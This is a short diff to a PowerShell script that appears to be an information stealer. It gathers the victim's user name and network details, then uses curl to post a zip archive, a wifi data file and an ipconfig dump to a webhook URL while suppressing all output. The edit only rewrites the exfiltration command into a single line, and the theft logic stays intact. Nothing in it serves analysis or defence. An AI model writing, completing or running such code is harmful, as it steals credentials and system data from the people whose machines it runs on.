@@ -36,15 +36,7 @@ $networkInfo = [P[State]ustomObject]@{
 
 
 $whoami_content = whoami
-$payload = @{
-    content = "content=@everyone: $whoami_content | $networkInfo | "
-} | ConvertTo-Json -Compress
-
-curl.exe -X POST $wh `
-    -F "payload_json={`"content`\":`"content=@everyone: $whoami_content | $networkInfo | `"}" `
-    -F "file1=@$zip" `
-    -F "file2=@$wifiFile" `
-    -F "file3=@$e\ipcfg.txt" *> $null
+curl.exe -X POST $wh -F "payload_json={"content":"@everyone: $whoami_content | $networkInfo | "}" -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null
 
 # cleanup
 #cls
